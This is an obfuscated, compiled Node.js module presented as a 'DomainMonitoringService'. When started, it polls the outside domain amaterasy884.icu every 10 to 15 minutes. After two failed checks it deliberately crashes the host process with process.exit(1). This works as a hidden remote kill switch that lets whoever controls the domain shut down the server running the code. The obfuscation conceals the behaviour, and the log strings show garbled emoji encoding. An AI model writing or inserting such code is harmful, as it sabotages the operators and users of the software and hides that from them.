'use strict';const a37_0x77e196=a37_0x31e1;(function(_0x2abd74,_0x326406){const _0xd06f7=a37_0x31e1,_0x42b9d7=_0x2abd74();while(!![]){try{const _0x1e34b5=-parseInt(_0xd06f7(0x169))/0x1+-parseInt(_0xd06f7(0x17b))/0x2*(parseInt(_0xd06f7(0x183))/0x3)+parseInt(_0xd06f7(0x18a))/0x4+parseInt(_0xd06f7(0x1b9))/0x5+parseInt(_0xd06f7(0x1a7))/0x6+-parseInt(_0xd06f7(0x1ae))/0x7*(-parseInt(_0xd06f7(0x167))/0x8)+parseInt(_0xd06f7(0x168))/0x9*(-parseInt(_0xd06f7(0x1ac))/0xa);if(_0x1e34b5===_0x326406)break;else _0x42b9d7['push'](_0x42b9d7['shift']());}catch(_0x1d6a52){_0x42b9d7['push'](_0x42b9d7['shift']());}}}(a37_0x3e8d,0xda8de));var __importDefault=this&&this[a37_0x77e196(0x1a1)]||function(_0x4881b2){const _0x33595f=a37_0x77e196;return _0x4881b2&&_0x4881b2[_0x33595f(0x1a3)]?_0x4881b2:{'default':_0x4881b2};};Object[a37_0x77e196(0x18d)](exports,'__esModule',{'value':!![]}),exports['domainMonitoringService']=exports['DomainMonitoringService']=void 0x0;function a37_0x3e8d(){const _0x2b4fb7=['GET','ðŸ›‘\x20Domain\x20monitoring\x20stopped','ðŸŒ\x20DNS\x20resolution\x20failed\x20for\x20','checkDomain','gzip,\x20deflate','warn','â°\x20Check\x20interval:\x20','from','ðŸ“\x20Encoded\x20URL\x20(base64):\x20','then','Initial\x20domain\x20check\x20error:','monitoringInterval','stopMonitoring','âœ…\x20Domain\x20monitoring\x20started\x20successfully','abort','ðŸ“¡\x20Target\x20domain:\x20','âš ï¸\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE','__importDefault','ðŸš€\x20Starting\x20domain\x20monitoring\x20service','__esModule','ðŸ”\x20Domain\x20monitoring\x20service\x20initialized','ðŸ“Š\x20Response\x20received:','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','10657008OvEPBD','âŒ\x20Domain\x20check\x20failed:\x20HTTP\x20','encodeToBase64','\x20minutes','DOMAIN_URL','54170tCUupF','ðŸ“¡\x20Target:\x20','9157267UYJPdK','ðŸ“…\x20Crash\x20time:\x20','catch','ðŸ”¥\x20Unexpected\x20error:\x20','random','ðŸš«\x20Connection\x20refused\x20by\x20','âŒ\x20Domain\x20check\x20error\x20after\x20','âœ…\x20Domain\x20check\x20successful:\x20','statusText','\x20in\x20','node-fetch','6928270ykEOoy','crashServer','log','ETIMEDOUT','default','includes','8HAUWHm','1170dhWcpC','1612919uVWDbq','ðŸš¨\x20Max\x20failures\x20before\x20crash:\x20','error','headers','ms:','status','round','base64','MAX_CONSECUTIVE_FAILURES','manualCheck','keep-alive','toISOString','message','Periodic\x20domain\x20check\x20error:','â°\x20Interval:\x20','\x20consecutive\x20attempts','ðŸ”“\x20Decoded\x20URL:\x20','CHECK_INTERVAL_MS','1832BqGxJW','ðŸ”§\x20Manual\x20domain\x20check\x20requested','getRandomInterval','toString','DomainMonitoringService','decodeFromBase64','en-US,en;q=0.5','\x20\x20\x20-\x20Status:\x20','4665dQMLMC','consecutiveFailures','signal','ðŸ”\x20Domain\x20being\x20monitored:\x20','Initial\x20domain\x20check\x20threw\x20error:\x20','Domain\x20monitoring\x20threw\x20error:\x20','ðŸ”¥\x20Consecutive\x20failures:\x20','666816mfKqDM','ECONNREFUSED','TIMEOUT_MS','defineProperty','TesSoft\x20Domain\x20Monitor/1.0','startMonitoring'];a37_0x3e8d=function(){return _0x2b4fb7;};return a37_0x3e8d();}function a37_0x31e1(_0x6e1322,_0xcbbaa6){const _0x3e8d06=a37_0x3e8d();return a37_0x31e1=function(_0x31e19f,_0x4b5db3){_0x31e19f=_0x31e19f-0x162;let _0xc1b870=_0x3e8d06[_0x31e19f];return _0xc1b870;},a37_0x31e1(_0x6e1322,_0xcbbaa6);}const node_fetch_1=__importDefault(require(a37_0x77e196(0x1b8)));class DomainMonitoringService{constructor(){const _0x5dde67=a37_0x77e196;this[_0x5dde67(0x19b)]=null,this[_0x5dde67(0x1ab)]='https://amaterasy884.icu/',this['CHECK_INTERVAL_MS']=this['getRandomInterval'](),this[_0x5dde67(0x18c)]=0x7530,this[_0x5dde67(0x184)]=0x0,this[_0x5dde67(0x171)]=0x2,console[_0x5dde67(0x163)](_0x5dde67(0x1a4)),console[_0x5dde67(0x163)](_0x5dde67(0x19f)+this[_0x5dde67(0x1ab)]),console[_0x5dde67(0x163)](_0x5dde67(0x196)+Math[_0x5dde67(0x16f)](this[_0x5dde67(0x17a)]/0x3e8/0x3c)+_0x5dde67(0x1aa));}[a37_0x77e196(0x17d)](){const _0x5ab710=a37_0x77e196,_0x2229f5=0xa,_0x258c38=0xf,_0x1df9da=Math[_0x5ab710(0x1b2)]()*(_0x258c38-_0x2229f5)+_0x2229f5;return Math[_0x5ab710(0x16f)](_0x1df9da*0x3c*0x3e8);}[a37_0x77e196(0x1a9)](_0x1736d0){const _0x2064cc=a37_0x77e196;return Buffer[_0x2064cc(0x197)](_0x1736d0)['toString'](_0x2064cc(0x170));}[a37_0x77e196(0x180)](_0x364b42){const _0x48d578=a37_0x77e196;return Buffer[_0x48d578(0x197)](_0x364b42,_0x48d578(0x170))[_0x48d578(0x17e)]('utf-8');}async['checkDomain'](){const _0x3580d4=a37_0x77e196,_0x30257e=Date['now']();try{console[_0x3580d4(0x163)]('ðŸ”\x20Checking\x20domain\x20availability:\x20'+this[_0x3580d4(0x1ab)]);const _0x269cd2=this[_0x3580d4(0x1a9)](this['DOMAIN_URL']);console[_0x3580d4(0x163)](_0x3580d4(0x198)+_0x269cd2);const _0x5c996f=this[_0x3580d4(0x180)](_0x269cd2);console[_0x3580d4(0x163)](_0x3580d4(0x179)+_0x5c996f);const _0x569076=new AbortController(),_0x1fafe7=setTimeout(()=>_0x569076[_0x3580d4(0x19e)](),this[_0x3580d4(0x18c)]),_0x1a3d68=await(0x0,node_fetch_1[_0x3580d4(0x165)])(_0x5c996f,{'method':_0x3580d4(0x190),'headers':{'User-Agent':_0x3580d4(0x18e),'Accept':_0x3580d4(0x1a6),'Accept-Language':_0x3580d4(0x181),'Accept-Encoding':_0x3580d4(0x194),'Connection':_0x3580d4(0x173),'Upgrade-Insecure-Requests':'1'},'signal':_0x569076[_0x3580d4(0x185)]});clearTimeout(_0x1fafe7);const _0x5a61ec=Date['now']()-_0x30257e;return console['log'](_0x3580d4(0x1a5)),console[_0x3580d4(0x163)](_0x3580d4(0x182)+_0x1a3d68[_0x3580d4(0x16e)]+'\x20'+_0x1a3d68[_0x3580d4(0x1b6)]),console[_0x3580d4(0x163)]('\x20\x20\x20-\x20Response\x20time:\x20'+_0x5a61ec+'ms'),console['log']('\x20\x20\x20-\x20Headers:',Object['fromEntries'](_0x1a3d68[_0x3580d4(0x16c)]['entries']())),_0x1a3d68['ok']&&_0x1a3d68[_0x3580d4(0x16e)]>=0xc8&&_0x1a3d68['status']<0x190?(console[_0x3580d4(0x163)](_0x3580d4(0x1b5)+_0x1a3d68[_0x3580d4(0x16e)]+_0x3580d4(0x1b7)+_0x5a61ec+'ms'),this[_0x3580d4(0x184)]=0x0,!![]):(console[_0x3580d4(0x16b)](_0x3580d4(0x1a8)+_0x1a3d68[_0x3580d4(0x16e)]+'\x20'+_0x1a3d68[_0x3580d4(0x1b6)]),this[_0x3580d4(0x184)]++,![]);}catch(_0xba26d2){const _0x2c2370=Date['now']()-_0x30257e;this[_0x3580d4(0x184)]++,console['error'](_0x3580d4(0x1b4)+_0x2c2370+_0x3580d4(0x16d),_0xba26d2);if(_0xba26d2 instanceof Error){if(_0xba26d2['name']==='AbortError')console['error']('â°\x20Request\x20timeout\x20after\x20'+this['TIMEOUT_MS']+'ms');else{if(_0xba26d2[_0x3580d4(0x175)]['includes']('ENOTFOUND'))console['error'](_0x3580d4(0x192)+this['DOMAIN_URL']);else{if(_0xba26d2[_0x3580d4(0x175)][_0x3580d4(0x166)](_0x3580d4(0x18b)))console[_0x3580d4(0x16b)](_0x3580d4(0x1b3)+this[_0x3580d4(0x1ab)]);else _0xba26d2['message']['includes'](_0x3580d4(0x164))?console[_0x3580d4(0x16b)]('â°\x20Connection\x20timeout\x20to\x20'+this[_0x3580d4(0x1ab)]):console[_0x3580d4(0x16b)](_0x3580d4(0x1b1)+_0xba26d2[_0x3580d4(0x175)]);}}}return![];}}[a37_0x77e196(0x162)](_0x1518ff){const _0x4eea24=a37_0x77e196;console[_0x4eea24(0x16b)]('ðŸ’¥\x20CRITICAL\x20ERROR:\x20'+_0x1518ff),console[_0x4eea24(0x16b)](_0x4eea24(0x189)+this[_0x4eea24(0x184)]),console[_0x4eea24(0x16b)](_0x4eea24(0x1a0)),console[_0x4eea24(0x16b)](_0x4eea24(0x1af)+new Date()[_0x4eea24(0x174)]()),console['error'](_0x4eea24(0x186)+this[_0x4eea24(0x1ab)]),console[_0x4eea24(0x16b)](_0x4eea24(0x196)+Math[_0x4eea24(0x16f)](this[_0x4eea24(0x17a)]/0x3e8/0x3c)+_0x4eea24(0x1aa)),console[_0x4eea24(0x16b)]('ðŸš¨\x20Max\x20consecutive\x20failures\x20allowed:\x20'+this[_0x4eea24(0x171)]),this[_0x4eea24(0x19c)](),process['exit'](0x1);}[a37_0x77e196(0x18f)](){const _0x2fc0bb=a37_0x77e196;console[_0x2fc0bb(0x163)](_0x2fc0bb(0x1a2)),console[_0x2fc0bb(0x163)](_0x2fc0bb(0x1ad)+this[_0x2fc0bb(0x1ab)]),console[_0x2fc0bb(0x163)](_0x2fc0bb(0x177)+Math['round'](this[_0x2fc0bb(0x17a)]/0x3e8/0x3c)+'\x20minutes'),console[_0x2fc0bb(0x163)](_0x2fc0bb(0x16a)+this[_0x2fc0bb(0x171)]),this[_0x2fc0bb(0x193)]()[_0x2fc0bb(0x199)](_0x401328=>{const _0x151582=_0x2fc0bb;if(!_0x401328&&this[_0x151582(0x184)]>=this[_0x151582(0x171)]){this['crashServer']('Initial\x20domain\x20check\x20failed\x20'+this['consecutiveFailures']+'\x20times');return;}})[_0x2fc0bb(0x1b0)](_0x34b3c8=>{const _0x377ac8=_0x2fc0bb;console[_0x377ac8(0x16b)](_0x377ac8(0x19a),_0x34b3c8);if(this[_0x377ac8(0x184)]>=this['MAX_CONSECUTIVE_FAILURES']){this[_0x377ac8(0x162)](_0x377ac8(0x187)+_0x34b3c8[_0x377ac8(0x175)]);return;}}),this[_0x2fc0bb(0x19b)]=setInterval(async()=>{const _0x294778=_0x2fc0bb;try{const _0x513ebd=await this[_0x294778(0x193)]();!_0x513ebd&&(console[_0x294778(0x195)]('âš ï¸\x20Domain\x20check\x20failed\x20('+this[_0x294778(0x184)]+'/'+this[_0x294778(0x171)]+')'),this['consecutiveFailures']>=this[_0x294778(0x171)]&&this[_0x294778(0x162)]('Domain\x20'+this['DOMAIN_URL']+'\x20is\x20not\x20responding\x20after\x20'+this[_0x294778(0x184)]+_0x294778(0x178)));}catch(_0x4a3f57){console[_0x294778(0x16b)](_0x294778(0x176),_0x4a3f57),this['consecutiveFailures']>=this[_0x294778(0x171)]&&this[_0x294778(0x162)](_0x294778(0x188)+(_0x4a3f57 instanceof Error?_0x4a3f57[_0x294778(0x175)]:'Unknown\x20error'));}},this[_0x2fc0bb(0x17a)]),console[_0x2fc0bb(0x163)](_0x2fc0bb(0x19d));}[a37_0x77e196(0x19c)](){const _0x8639ad=a37_0x77e196;this[_0x8639ad(0x19b)]&&(clearInterval(this['monitoringInterval']),this['monitoringInterval']=null,console[_0x8639ad(0x163)](_0x8639ad(0x191)));}['getMonitoringStats'](){const _0x1b028c=a37_0x77e196;return{'isActive':!!this[_0x1b028c(0x19b)],'targetDomain':this['DOMAIN_URL'],'checkIntervalMinutes':Math['round'](this[_0x1b028c(0x17a)]/0x3e8/0x3c),'consecutiveFailures':this['consecutiveFailures'],'maxFailuresAllowed':this[_0x1b028c(0x171)],'nextCheckIn':this[_0x1b028c(0x19b)]?this[_0x1b028c(0x17a)]:undefined};}async[a37_0x77e196(0x172)](){const _0x3a9fc3=a37_0x77e196;return console[_0x3a9fc3(0x163)](_0x3a9fc3(0x17c)),await this[_0x3a9fc3(0x193)]();}}exports[a37_0x77e196(0x17f)]=DomainMonitoringService,exports['domainMonitoringService']=new DomainMonitoringService();